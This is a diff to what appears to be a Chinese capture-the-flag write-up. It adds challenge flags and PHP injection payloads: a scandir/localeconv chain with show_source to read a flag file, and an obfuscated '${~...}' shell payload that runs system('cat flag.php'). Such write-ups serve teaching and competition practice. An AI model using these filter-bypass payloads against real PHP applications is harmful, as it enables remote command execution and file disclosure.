@@ -106,7 +106,7 @@ while 1:
         break
     sub_400BCF(0)
 print(''.join([chr(x) for x in flag]))
-
+# flag{51mpl3_v1rtu@l_m@ch1n3}
 ```
 
 
@@ -185,4 +185,14 @@ scandir(pos(localeconv())) => scandir('.')
 
 最终payload `?exp=echo(highlight_file(next(array_reverse(scandir(pos(localeconv()))))));`
 
+或 `?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));`
+
 显示出flag
+
+`xmctf{4daaf692b14569babe0dfc7d6e67698e}`
+
+## web4
+
+`dhudndrgrhs.php?shell=${~"\xa0\xb8\xba\xab"}[1](${~"\xa0\xb8\xba\xab"}[2]);&1=system&2=cat flag.php`
+
+`$flag='xmflag{yi_giao_wo_li_giao_giao}';`
